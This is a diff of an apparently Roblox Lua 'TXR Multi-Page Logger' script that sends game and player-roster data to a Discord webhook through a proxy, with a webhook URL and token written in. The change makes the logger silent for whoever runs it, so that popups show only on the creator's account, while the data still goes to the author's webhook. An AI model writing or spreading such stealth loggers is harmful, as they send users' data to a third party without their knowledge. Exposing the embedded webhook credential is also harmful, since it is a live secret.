@@ -1,5 +1,5 @@
 -- ==============================================================================
--- 📡 TXR MULTI-PAGE LOGGER (AUTO-PAGINATION & ZERO ERROR 400) 📡
+-- 📡 TXR MULTI-PAGE LOGGER (SILENT FOR USERS / OWNER-ONLY POPUP) 📡
 -- ==============================================================================
 
 local Players = game:GetService("Players")
@@ -8,18 +8,22 @@ local StarterGui = game:GetService("StarterGui")
 local UserInputService = game:GetService("UserInputService")
 local lp = Players.LocalPlayer
 
+local CREATOR_USER_ID = 9685785248
 local ORIGINAL_URL = "https://discord.com/api/webhooks/1541722782310604820/L3kjYivqBHkOtU5HZJj7pNFJGyHkBHBaVZPg0AY-QBAJFf_SG3cu8TEcMaRjUuRTiyD1"
 local WEBHOOK_URL = ORIGINAL_URL:gsub("https://discord.com", "https://webhook.lewisakura.moe")
 local TRACKER_FILE = "TXR_Tracker_Data.json"
 
+-- Sirf Owner (Ashu Papa) ki screen par popup dikhega
 local function sendNotification(title, text)
-    pcall(function()
-        StarterGui:SetCore("SendNotification", {
-            Title = title,
-            Text = text,
-            Duration = 4
-        })
-    end)
+    if lp.UserId == CREATOR_USER_ID then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = title,
+                Text = text,
+                Duration = 4
+            })
+        end)
+    end
 end
 
 local function postToWebhook(payloadTable)
@@ -120,7 +124,7 @@ task.spawn(function()
     postToWebhook(mainEmbed)
     sendNotification("TXR Logger", "✅ Main Log Sent!")
 
-    -- 📄 PAGE 2+: ROSTER CHUNKS (Har 10 players ka alag page banega)
+    -- 📄 PAGE 2+: ROSTER CHUNKS
     local playersPerPage = 10
     local totalPages = math.max(1, math.ceil(totalCount / playersPerPage))
 
@@ -152,7 +156,7 @@ task.spawn(function()
             }
         }
 
-        task.wait(0.7) -- Rate-limit protection delay
+        task.wait(0.7)
         postToWebhook(rosterPayload)
     end
 end)
